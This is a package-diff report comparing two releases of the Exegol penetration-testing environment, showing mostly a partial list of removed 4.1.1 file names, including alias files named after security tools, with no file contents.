# Comparing `tmp/Exegol-4.1.1.tar.gz` & `tmp/Exegol-4.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "Exegol-4.1.1.tar", last modified: Wed Dec  7 19:38:25 2022, max compression
+gzip compressed data, was "Exegol-4.2.0.tar", last modified: Wed May 10 03:26:51 2023, max compression
```

## Comparing `Exegol-4.1.1.tar` & `Exegol-4.2.0.tar`

### file list

```diff
@@ -1,376 +1,421 @@
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.802257 Exegol-4.1.1/
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.766257 Exegol-4.1.1/Exegol.egg-info/
--rw-------   0 dramelac  (1000) dramelac  (1000)     5552 2022-12-07 19:38:25.000000 Exegol-4.1.1/Exegol.egg-info/PKG-INFO
--rw-------   0 dramelac  (1000) dramelac  (1000)    16624 2022-12-07 19:38:25.000000 Exegol-4.1.1/Exegol.egg-info/SOURCES.txt
--rw-------   0 dramelac  (1000) dramelac  (1000)        1 2022-12-07 19:38:25.000000 Exegol-4.1.1/Exegol.egg-info/dependency_links.txt
--rw-------   0 dramelac  (1000) dramelac  (1000)       64 2022-12-07 19:38:25.000000 Exegol-4.1.1/Exegol.egg-info/entry_points.txt
--rw-------   0 dramelac  (1000) dramelac  (1000)       53 2022-12-07 19:38:25.000000 Exegol-4.1.1/Exegol.egg-info/requires.txt
--rw-------   0 dramelac  (1000) dramelac  (1000)        7 2022-12-07 19:38:25.000000 Exegol-4.1.1/Exegol.egg-info/top_level.txt
--rw-r-----   0 dramelac  (1000) dramelac  (1000)    35149 2020-10-22 13:01:34.000000 Exegol-4.1.1/LICENSE
--rw-------   0 dramelac  (1000) dramelac  (1000)     5552 2022-12-07 19:38:25.802257 Exegol-4.1.1/PKG-INFO
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     4522 2022-12-07 19:35:44.000000 Exegol-4.1.1/README.md
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.766257 Exegol-4.1.1/exegol/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      114 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/__init__.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      265 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/__main__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.798257 Exegol-4.1.1/exegol/console/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     1148 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/console/ConsoleFormat.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      150 2022-05-01 15:03:08.000000 Exegol-4.1.1/exegol/console/ExegolBox.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      585 2022-11-03 15:06:34.000000 Exegol-4.1.1/exegol/console/ExegolProgress.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      509 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/console/ExegolPrompt.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     1861 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/console/LayerTextColumn.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    25379 2022-12-07 19:11:05.000000 Exegol-4.1.1/exegol/console/TUI.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/console/__init__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.798257 Exegol-4.1.1/exegol/console/cli/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     2556 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/console/cli/ParametersManager.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/console/cli/__init__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.802257 Exegol-4.1.1/exegol/console/cli/actions/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     7333 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/console/cli/actions/Command.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    15069 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/console/cli/actions/ExegolParameters.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    11735 2022-12-07 19:13:10.000000 Exegol-4.1.1/exegol/console/cli/actions/GenericParameters.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/console/cli/actions/__init__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.802257 Exegol-4.1.1/exegol/exceptions/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      436 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/exceptions/ExegolExceptions.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/exceptions/__init__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.802257 Exegol-4.1.1/exegol/manager/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     2839 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/manager/ExegolController.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    29335 2022-12-07 19:14:20.000000 Exegol-4.1.1/exegol/manager/ExegolManager.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    19052 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/manager/UpdateManager.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/manager/__init__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.802257 Exegol-4.1.1/exegol/model/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    57714 2022-12-07 19:15:25.000000 Exegol-4.1.1/exegol/model/ContainerConfig.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    12905 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/model/ExegolContainer.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     1066 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/model/ExegolContainerTemplate.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    29876 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/model/ExegolImage.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     5225 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/model/ExegolModules.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     3785 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/model/MetaImages.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      331 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/model/SelectableInterface.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/model/__init__.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.802257 Exegol-4.1.1/exegol/utils/
--rw-rw-rw-   0 dramelac  (1000) dramelac  (1000)     2985 2022-12-07 19:32:54.000000 Exegol-4.1.1/exegol/utils/ConstantConfig.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    28556 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/utils/DockerUtils.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     7666 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/utils/EnvInfo.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     4977 2022-09-07 18:54:44.000000 Exegol-4.1.1/exegol/utils/ExeLog.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     3950 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/utils/FsUtils.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    17642 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/utils/GitUtils.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    17437 2022-11-28 15:58:49.000000 Exegol-4.1.1/exegol/utils/GuiUtils.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      607 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/utils/MetaSingleton.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     9366 2022-12-07 19:13:10.000000 Exegol-4.1.1/exegol/utils/UserConfig.py
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     7396 2022-12-07 18:58:14.000000 Exegol-4.1.1/exegol/utils/WebUtils.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)        0 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/utils/__init__.py
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     5084 2022-04-30 21:01:05.000000 Exegol-4.1.1/exegol/utils/argParse.py
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.766257 Exegol-4.1.1/exegol-docker-build/
--rw-------   0 dramelac  (1000) dramelac  (1000)     1768 2022-12-07 19:32:06.000000 Exegol-4.1.1/exegol-docker-build/Dockerfile
--rw-------   0 dramelac  (1000) dramelac  (1000)     1704 2022-12-07 19:32:06.000000 Exegol-4.1.1/exegol-docker-build/ad.dockerfile
--rw-------   0 dramelac  (1000) dramelac  (1000)     1446 2022-12-07 19:32:07.000000 Exegol-4.1.1/exegol-docker-build/debug.dockerfile
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)      993 2022-11-28 13:45:21.000000 Exegol-4.1.1/exegol-docker-build/dev.dockerfile
--rw-------   0 dramelac  (1000) dramelac  (1000)     1714 2022-12-07 19:32:07.000000 Exegol-4.1.1/exegol-docker-build/light.dockerfile
--rw-------   0 dramelac  (1000) dramelac  (1000)     1714 2022-12-07 19:32:07.000000 Exegol-4.1.1/exegol-docker-build/osint.dockerfile
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.766257 Exegol-4.1.1/exegol-docker-build/sources/
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.766257 Exegol-4.1.1/exegol-docker-build/sources/bloodhound/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      864 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/bloodhound/config.json
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)    37317 2022-10-12 08:14:18.000000 Exegol-4.1.1/exegol-docker-build/sources/bloodhound/customqueries.json
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.766257 Exegol-4.1.1/exegol-docker-build/sources/crackmapexec/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)      350 2022-10-12 08:14:18.000000 Exegol-4.1.1/exegol-docker-build/sources/crackmapexec/cme.conf
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/exegol/
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/exegol/build_pipeline_tests/
--rw-------   0 dramelac  (1000) dramelac  (1000)      834 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/build_pipeline_tests/ingest_tests.py
--rw-------   0 dramelac  (1000) dramelac  (1000)     3456 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/entrypoint.sh
--rw-------   0 dramelac  (1000) dramelac  (1000)     4950 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/load_supported_setups.sh
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/
--rw-------   0 dramelac  (1000) dramelac  (1000)     1523 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/README.md
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/apt/
--rw-------   0 dramelac  (1000) dramelac  (1000)      121 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/apt/keys.list
--rw-------   0 dramelac  (1000) dramelac  (1000)      298 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/apt/packages.list
--rw-------   0 dramelac  (1000) dramelac  (1000)      210 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/apt/sources.list
--rw-------   0 dramelac  (1000) dramelac  (1000)      621 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/load_user_setup.sh
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/python3/
--rw-------   0 dramelac  (1000) dramelac  (1000)      344 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/python3/requirements.txt
--rw-------   0 dramelac  (1000) dramelac  (1000)     2716 2022-12-07 19:32:07.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/supported_setups.md
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/zsh/
--rw-------   0 dramelac  (1000) dramelac  (1000)       93 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/zsh/aliases
--rw-------   0 dramelac  (1000) dramelac  (1000)       93 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/zsh/history
--rw-------   0 dramelac  (1000) dramelac  (1000)      304 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/zsh/zshrc
--rw-------   0 dramelac  (1000) dramelac  (1000)     1379 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/exegol/start.sh
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/grc/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      234 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.cme
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      403 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.describeTicket
--rw-------   0 dramelac  (1000) dramelac  (1000)      604 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.getgpppassword
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      318 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.krbrelayx
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     2002 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.ntlmrelayx
--rw-r-----   0 dramelac  (1000) dramelac  (1000)      533 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.rbcd
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     1026 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/conf.secretsdump
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     4243 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/grc/grc.conf
--rw-------   0 dramelac  (1000) dramelac  (1000)   125064 2022-12-07 19:32:07.000000 Exegol-4.1.1/exegol-docker-build/sources/install.sh
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/logrotate/
--rw-------   0 dramelac  (1000) dramelac  (1000)      129 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/logrotate/exegol_vpn
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/patches/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     6308 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/patches/undefined-symbol-aesni-key.patch
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/proxychains/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)     5593 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/proxychains/proxychains.conf
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/tmux/
--rw-r-----   0 dramelac  (1000) dramelac  (1000)       39 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/tmux/tmux.conf
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.770257 Exegol-4.1.1/exegol-docker-build/sources/trilium/
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)      938 2022-10-12 08:14:18.000000 Exegol-4.1.1/exegol-docker-build/sources/trilium/config.ini
--rw-r-----   0 dramelac  (1000) dramelac  (1000)  1470464 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/trilium/document.db
--rw-r-----   0 dramelac  (1000) dramelac  (1000)    32768 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/trilium/document.db-shm
--rw-r-----   0 dramelac  (1000) dramelac  (1000)  4169472 2022-04-22 11:24:49.000000 Exegol-4.1.1/exegol-docker-build/sources/trilium/document.db-wal
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.782257 Exegol-4.1.1/exegol-docker-build/sources/zsh/
--rw-------   0 dramelac  (1000) dramelac  (1000)      764 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.790257 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/
--rw-------   0 dramelac  (1000) dramelac  (1000)       37 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/aircrack-ng
--rw-------   0 dramelac  (1000) dramelac  (1000)       33 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/arsenal
--rw-------   0 dramelac  (1000) dramelac  (1000)       47 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/bettercap
--rw-------   0 dramelac  (1000) dramelac  (1000)       47 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/blazy
--rw-------   0 dramelac  (1000) dramelac  (1000)      288 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/bloodhound
--rw-------   0 dramelac  (1000) dramelac  (1000)       69 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/bloodhound-py
--rw-------   0 dramelac  (1000) dramelac  (1000)      138 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/bloodhound-quickwin
--rw-------   0 dramelac  (1000) dramelac  (1000)       45 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/bolt
--rw-------   0 dramelac  (1000) dramelac  (1000)       97 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/burpsuite
--rw-------   0 dramelac  (1000) dramelac  (1000)       51 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/byp4xx
--rw-------   0 dramelac  (1000) dramelac  (1000)       60 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/carbon14
--rw-------   0 dramelac  (1000) dramelac  (1000)      123 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/cloudfail
--rw-------   0 dramelac  (1000) dramelac  (1000)       62 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/corscanner
--rw-------   0 dramelac  (1000) dramelac  (1000)       66 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/crackhound
--rw-------   0 dramelac  (1000) dramelac  (1000)      210 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/crackmapexec
--rw-------   0 dramelac  (1000) dramelac  (1000)       52 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/cypheroth
--rw-------   0 dramelac  (1000) dramelac  (1000)      124 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/darkarmour
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/dfscoerce
--rw-------   0 dramelac  (1000) dramelac  (1000)       46 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/dnschef
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/donpapi
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/eaphammer
--rw-------   0 dramelac  (1000) dramelac  (1000)       24 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/emacs-nox
--rw-------   0 dramelac  (1000) dramelac  (1000)      124 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/empire
--rw-------   0 dramelac  (1000) dramelac  (1000)       44 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/enyx
--rw-------   0 dramelac  (1000) dramelac  (1000)       70 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/eyewitness
--rw-------   0 dramelac  (1000) dramelac  (1000)       55 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/feroxbuster
--rw-------   0 dramelac  (1000) dramelac  (1000)       65 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/finalrecon
--rw-------   0 dramelac  (1000) dramelac  (1000)       90 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/finduncommonshares
--rw-------   0 dramelac  (1000) dramelac  (1000)      124 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/fuxploider
--rw-------   0 dramelac  (1000) dramelac  (1000)      115 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/fzf
--rw-------   0 dramelac  (1000) dramelac  (1000)       19 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/gdb
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ghidra
--rw-------   0 dramelac  (1000) dramelac  (1000)      224 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ghunt
--rw-------   0 dramelac  (1000) dramelac  (1000)       55 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/git-dumper
--rw-------   0 dramelac  (1000) dramelac  (1000)       58 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/gittools
--rw-------   0 dramelac  (1000) dramelac  (1000)       66 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/gmsadumper
--rw-------   0 dramelac  (1000) dramelac  (1000)       49 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/gopherus
--rw-------   0 dramelac  (1000) dramelac  (1000)      137 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/gpp-decrypt
--rw-------   0 dramelac  (1000) dramelac  (1000)       17 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/grc
--rw-------   0 dramelac  (1000) dramelac  (1000)       58 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/h2csmuggler
--rw-------   0 dramelac  (1000) dramelac  (1000)       41 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ida
--rw-------   0 dramelac  (1000) dramelac  (1000)      192 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/impacket
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/infoga
--rw-------   0 dramelac  (1000) dramelac  (1000)       60 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/jd-gui
--rw-------   0 dramelac  (1000) dramelac  (1000)       73 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/jdwp-shellifier
--rw-------   0 dramelac  (1000) dramelac  (1000)       38 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/john-the-ripper
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/joomscan
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/jwt_tool
--rw-------   0 dramelac  (1000) dramelac  (1000)      120 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/kadimus
--rw-------   0 dramelac  (1000) dramelac  (1000)      279 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/krbrelayx
--rw-------   0 dramelac  (1000) dramelac  (1000)       75 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ldaprelayscan
--rw-------   0 dramelac  (1000) dramelac  (1000)      141 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ldapsearch-ad
--rw-------   0 dramelac  (1000) dramelac  (1000)       70 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/libmspack
--rw-------   0 dramelac  (1000) dramelac  (1000)       72 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/libnfc-crypto1-crack
--rw-------   0 dramelac  (1000) dramelac  (1000)       87 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/linkedin2username
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/linkfinder
--rw-------   0 dramelac  (1000) dramelac  (1000)       60 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/lnkup
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/mfdread
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/moodlescan
--rw-------   0 dramelac  (1000) dramelac  (1000)      404 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/mousejack
--rw-------   0 dramelac  (1000) dramelac  (1000)       83 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/nmap
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/nosqlmap
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ntlmv1-multi
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/oaburl
--rw-------   0 dramelac  (1000) dramelac  (1000)       60 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/oneforall
--rw-------   0 dramelac  (1000) dramelac  (1000)       48 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pcredz
--rw-------   0 dramelac  (1000) dramelac  (1000)       66 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/petitpotam
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/photon
